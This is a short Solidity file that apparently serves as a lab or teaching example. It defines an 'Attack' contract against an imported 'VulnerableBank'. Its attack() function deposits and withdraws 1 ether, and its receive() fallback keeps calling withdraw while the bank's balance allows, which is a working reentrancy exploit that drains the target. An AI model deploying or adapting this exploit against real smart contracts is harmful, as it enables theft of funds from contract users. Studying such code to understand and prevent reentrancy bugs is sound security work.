// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import ".\reentrancy.sol";

contract Attack {

    VulnerableBank bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    // Start attack
    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    // This function runs again and again
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }
}
